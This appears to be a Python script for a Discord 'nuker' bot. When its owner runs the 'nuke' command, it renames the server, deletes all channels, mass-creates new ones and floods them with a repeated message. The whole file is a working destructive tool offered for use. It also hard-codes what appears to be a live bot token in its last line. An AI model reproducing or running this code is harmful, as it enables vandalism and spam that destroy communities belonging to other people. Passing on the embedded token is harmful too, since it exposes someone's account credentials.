uid = int("YOUR_USER_ID_HERE")
custom_message = str(input("[!] Enter the first message in the channel you want: "))
custom_channel_name = str(input("[!] Enter the channel name you want: "))
new_server_name = str(input("[!] Enter the new server name you want: "))
custom_channel_amount = int(input("[!] Enter how many channels you want: "))
custom_message_amount = int(input("[!] Enter how many times you want to repeat the message for: "))

import discord
from discord.ext import commands
import random
import asyncio

bot = commands.Bot(command_prefix="run!", intents=discord.Intents.all())

@bot.event
async def on_ready():
    await bot.change_presence(
        status=discord.Status.do_not_disturb,
        activity=discord.Activity(type=discord.ActivityType.listening, name="!cmds")
    )

@bot.command(name="nuke")
async def nuke(ctx):
    if uid != ctx.author.id:
        return

    guild = ctx.guild

    if guild:
        await guild.edit(name=new_server_name)

        async def create_channel_and_send_messages():
            for i in range(custom_channel_amount):
                try:
                    new_channel = await guild.create_text_channel(f'{custom_channel_name}')
                    async def send_messages_to_channel(channel):
                        for _ in range(custom_message_amount):
                            try:
                                await channel.send(f"{custom_message}")
                            except Exception as e:
                                print(f"Error sending message to {channel.name}: {e}")

                    asyncio.create_task(send_messages_to_channel(new_channel))
                    
                except Exception as e:
                    print(f"Error creating channel: {e}")

        try:
            channels = await guild.fetch_channels()
            for channel in channels:
                try:
                    await channel.delete()
                except Exception as e:
                    print(f"Error deleting channel {channel.name}: {e}")
        except Exception as e:
            print(f"Error fetching channels: {e}")

        await create_channel_and_send_messages()
        print("Done.")
        exit()
    else:
        await ctx.send("Guild not found.")

bot.run("MTI4NDI4NTM2NjA4MTI5MDI3MQ.GV1pgZ.VCuc53lo-mt2LOVgzihstk7M7r75W4MZETxCSs")
